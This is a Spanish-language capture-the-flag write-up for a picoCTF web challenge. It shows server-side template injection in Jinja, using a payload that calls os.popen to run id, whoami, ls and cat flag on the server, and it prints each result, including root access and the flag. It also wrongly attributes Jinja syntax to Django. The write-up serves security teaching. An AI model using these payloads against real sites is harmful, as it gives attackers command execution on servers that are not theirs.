## Descripción
I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.
## Solución
1- Si colocamos un {{1+1}} en el input de la página vemos que el resultado en vez de ser literalmente "{{1 + 1}}" nos sale que es 2. Esto quiere decir que la página es vulnerable a una inyección SSTI con sintaxis de Jinja (sintaxis que usa Django).
2- Podemos hacer una inyección con la sintaxis de Jinja.
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
Si usamos esa inyección la página nos muestra esto:
```
# uid=0(root) gid=0(root) groups=0(root)
```
3- Si usamos esta inyección 
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```
La página nos dice que somos root
```
# root
```
5- Usamos esta inyección para ver si hay archivos del lado del servidor.
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read() }}
```
Nos da esto
```
# . .. __pycache__ app.py flag requirements.txt
```
6- Usamos esta inyección 
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
```
Y nos da la bandera
```
# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}
```
## Notas adicionales
La sintaxis de la inyección y de varias inyecciones para distintos lenguajes la encontré en este repositorio: [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
## Referencias
- https://portswigger.net/web-security/server-side-template-injection
- https://www.youtube.com/watch?v=fx7WGNKJG20